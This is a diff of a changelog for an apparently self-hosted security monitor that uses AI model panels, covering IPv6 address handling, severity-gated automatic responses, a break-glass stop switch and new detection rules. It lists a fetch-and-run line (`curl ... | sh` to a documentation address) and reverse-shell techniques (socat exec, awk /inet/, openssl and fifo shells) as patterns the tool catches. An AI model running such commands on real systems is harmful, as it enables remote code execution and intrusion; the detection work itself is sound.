@@ -1,6 +1,132 @@
 # Changelog
 
-## Unreleased (2026-11-04)
+## 2026-11-18 (v0.1.9)
+
+### IPv6 everywhere an address is read
+- One address reader for every agent (`agents/agent_util.py`: `find_ip`, `find_ip_port`, `ssh_source`, `split_host_port`,
+  `normalise_ip`): IPv4 and IPv6, bracketed (`[2001:db8::5]:22`), with a zone (`fe80::1%eth0`) or IPv4-mapped
+  (`::ffff:203.0.113.5` counts as `203.0.113.5`). Times, MAC addresses and version strings are never taken for addresses.
+- **SSH log:** every IPv6 attacker used to be counted as one address called "unknown" (no per-address alarm, no
+  "login after failures", a false "brute force from unknown"). Each address now counts on its own, and the address is taken
+  from sshd's own `from <address> port <n>` at the end of the line, not from a user name the attacker chose.
+  Unchanged on purpose: one guess at a user name that does not exist still counts twice ("Invalid user" + "Failed password").
+- **Blocking:** `[2001:db8::5]:4444` is now understood. An IPv6 firewall block is inserted above the first IPv6 rule (ufw keeps
+  two lists and refuses an IPv6 rule at an IPv4 rule's number); before, it was appended below the IPv6 allow rules, where it did
+  nothing for ports like SSH. If IPv6 is switched off in ufw, the error says how to switch it on.
+- **Inside the network** now includes IPv6 loopback, unique-local (`fd..`) and link-local (`fe80::`), plus 169.254/16 and
+  100.64/10 (Tailscale): such peers are no longer treated as the internet, and they are masked on the dashboard and by the Windows
+  agent (`fd12:3456:xxxx::`). A masked IPv6 address is never blocked.
+- **Firewall log:** IPv6 UFW BLOCK lines are read. Inbound is also recognised from `IN=eth0 OUT=` (a packet to this host),
+  because IPv6 has no NAT and its destination is rarely a private address.
+- **Outbound connections, direct checks, threat feeds, process rules:** IPv6 peers are checked against the C2 port list and the
+  feeds; the direct checks confirm IPv6 connections, failed logins and feed listings (so automatic response can act on them, with
+  every limit unchanged); `curl http://[2001:db8::5]/x.sh | sh` and openssl shells to an IPv6 address are caught.
+- **Dashboard:** the Block button and "What this could be?" commands accept IPv6; the MASKED tag recognises masked IPv6.
+- Stays IPv4 on purpose: the network scan (an IPv6 home network has too many addresses to scan) and `set-network.sh`.
+- Windows agent 0.2.2 (IPv6 masking). Tests: new `tools/test_ipv6.py` (documentation addresses only).
+
+### Action-risk policy: what SSAI may do on its own, by severity (Week 2)
+- One policy (`backend/action_risk.py`) for both automatic paths. When a finding **arrives**, only **low** findings may be acted on.
+  **Medium** findings wait for the AI panel's verdict and are acted on only with **full consensus**: at least two **different model
+  families** voted malicious (looked up from this hub's own model list, never from the verdict; two models of the same family count
+  once; unknown or switched-off models do not count), confidence of at least 90 by default, and nothing disputes it. A direct check of
+  the machine must still confirm it. **High** and **critical** always go to a person.
+- What this means today: the detectors label brute force and feed hits **medium** and miners/reverse shells **high**, so nothing is
+  acted on when it first arrives any more; medium findings can be acted on after the vote (when automatic response is switched on).
+- **Agreement standard:** the administrator can raise the number of model families and the confidence; SSAI enforces floors of 2
+  families and confidence 80.
+- **`allow_severe` removed** from the permissions to act without asking: a permission covers low and medium only, and medium needs
+  full consensus. Permissions stored before this change are refused for high and critical too.
+
+### Consensus-gated pause (owner decision, 16 November 2026)
+- A **high or critical** miner or reverse shell may be **paused** (never killed, never a block) without waiting for a person, when the
+  agreement standard is met and a direct check confirms the same program is still running. **Off by default**; it can only be switched
+  on after a test alert has been sent and acknowledged. The never-pause list, system accounts and SSAI itself are still never paused.
+- **A paused program stays paused** (for every pause, not only these) until a person chooses Undo (resume), End program or the new
+  **Keep paused**. The time limit no longer resumes a pause, so an attacker is never let back in by a timer. Blocks still end at their
+  time limit.
+
+### Alerts
+- Every live automatic action and every consensus-gated pause raises an **alert**. First channel: the dashboard (a red bar until a
+  person acknowledges it; Settings > Automatic response > Alerts). A channel counts as working only after a person acknowledges a
+  test alert. Alerts carry the finding number and the program name, never a command line or an action link.
+
+### Fixes
+- **An unknown severity now becomes medium, not low**, when a finding is submitted (low is the only severity acted on
+  when a finding arrives). A permission's automatic approval now raises an alert too, and the verdict path never blocks a
+  target a permission already approved.
+- **Pause logged "failed" although the process stopped** (15 Nov Part C): if the pause call reports an error but the same program is
+  now stopped, it is recorded as paused, so Undo works. The original cause could not be reproduced on this build; this closes the
+  effect.
+- **Firewall preflight:** Settings warns when ufw is off or Pi-hole is not configured, because a block would then fail.
+- **GitHub panel stood still since 4 November** ("last push 334 h ago", 0 committed): every finding since then was a repeat of a known
+  threat, which the ledger never published, and the committed count was database rows minus a baseline that the clean-up job had
+  pushed below zero. The ledger now publishes repeat sightings (at most hourly), the panel counts the published ledger, lists the
+  newest ledger commits and says when the reporter last checked.
+
+## 2026-11-17 (v0.1.9)
+
+### Break-glass: one switch that stops every automatic action
+- New **Stop all automatic actions now** button at the top of Settings > Automatic response (also `POST /api/auto/break-glass/engage`).
+  While it is on, neither the automatic responses nor the permissions to act without asking do anything; monitoring, alerts and
+  everything a person does by hand carry on. Any admin may engage it (the admin key too: stopping is the safe direction);
+  only a signed-in person may release it. Both are written to the audit log first.
+- It turns on **by itself** when a live automatic action reaches the cap of 10 an hour, so a runaway loop stops until a person
+  looks. A dry run never trips it. A state file that cannot be read counts as ON.
+- **Never-pause list:** databases, the model server, sshd, systemd, Docker and containerd are never paused automatically, even if
+  a finding says so (they are still reported, and a person decides). `SSAI_NEVER_PAUSE` adds names.
+- `docs/audit/week1-automation-map.md`: every code path that can act, what triggers it, and what stops it.
+- Tests: `tools/test_break_glass.py` (18); `tools/test_route_auth.py` lists the release route as person-only.
+
+## 2026-11-16 (v0.1.9)
+
+### The Settings menu is always reachable
+- The gear in the far top-right corner (where screen overlays sit) is now a labeled **Settings** button that never shrinks;
+  Sign out is a proper text button; narrow windows hide the clock and status labels before any button. Settings is also
+  linked from the side navigation of both views. Escape closes the menu.
+
+### Better detection (15 November fixes, rebuilt on the home build)
+- **File integrity** compares SHA-256 contents: an edit with its size and time put back is a HIGH alert, `touch` or an
+  identical rewrite is silent, a mode or owner change always alerts; `/etc/group` is watched. A change to passwd/group/shadow
+  is skipped only with proof it is harmless (a system account that cannot log in, created during a package install or just
+  after a person's sudo); new login accounts, admin-group additions, password changes and deletions always alert.
+- **Sign-ins**: a login right after 5+ failures from that address is a CRITICAL "brute-force-success". Per-address counts
+  forget after 48 hours. Slow, spread-out password guessing is caught (1 hour, 24 hours, and one account from 3 addresses).
+- **Processes**: busybox/toybox wrappers, `--exec`, socat exec, awk `/inet/`, openssl and fifo shells, downloads from a bare
+  IP that are then run, programs in hidden temp folders, miner arguments on renamed binaries, fake kernel threads, and a
+  program from /tmp, /var/tmp or /dev/shm using a full core for 10+ minutes.
+- **Ports**: mining-pool ports count as "phoning home"; a port open only to this machine is reported only when its owner is
+  odd (nc, a shell, a program in a temp folder).
+
+### Look again before acting
+- Before anything acts on its own, SSAI checks the machine itself at that moment (process still running with the same
+  command line, port still open, connection still there, failed logins in auth.log, feed still lists it). Anything but
+  "confirmed" means a person decides. The result is shown on the verdict ("not confirmed by a direct check").
+
+### Automatic response (off, and dry run, until you change it)
+- Settings, **Automatic response**: block an attacking address (20+ failed logins), block a feed-listed address or website,
+  pause (not kill) a miner or reverse shell owned by a person's account. Dry run first writes what it *would* have done.
+  Only a signed-in person changes it, presses Undo or End program. Audit line before every action, at most 10 automatic
+  actions an hour (shared with autonomy grants), every block and pause ends after its time limit (default 24 h).
+
+### Dashboard
+- The IOC / Origin column shows a device name (Pi-hole, reverse DNS or the network card's maker). A **MASKED** tag opens
+  what is known about a hidden LAN address. Every row has **What this could be?**: likely causes, how to tell, how to fix.
+
+### Hardening and memory
+- The prompt-injection scanner sees through accents, look-alike letters, leetspeak, spacing, reversal, ROT13 and base64/hex/
+  URL/HTML/\u encodings, and knows French, Spanish, German, Italian, Portuguese, Russian and Chinese. New flag
+  "obfuscated-text". Input capped at 20,000 characters.
+- Local AI models leave memory right after answering (`SSAI_OLLAMA_KEEP_ALIVE`, default 0). The dashboard service runs one
+  worker with 8 threads (new installs; an existing service file is changed by the operator).
+
+### Notes
+- `docs/audit/week1-audit-2026-11-16.md`: read-only audit (remediation, auto-proceed, rollback, audit trail, telemetry,
+  feeds, Ollama discovery). `docs/plans/zeek-and-feeds-plan.md`: plan only.
+- Tests: test_change_evidence, test_file_integrity, test_slow_bruteforce, test_live_checks, test_auto_response,
+  test_injection_guard (new); several others extended. Tests no longer write to the real cloud audit log.
+
+## 2026-11-04
 
 ### A clean install on a real VM, and what it showed
 - **Private releases (optional).** If the releases repository is ever made private, an install can be given a read-only GitHub
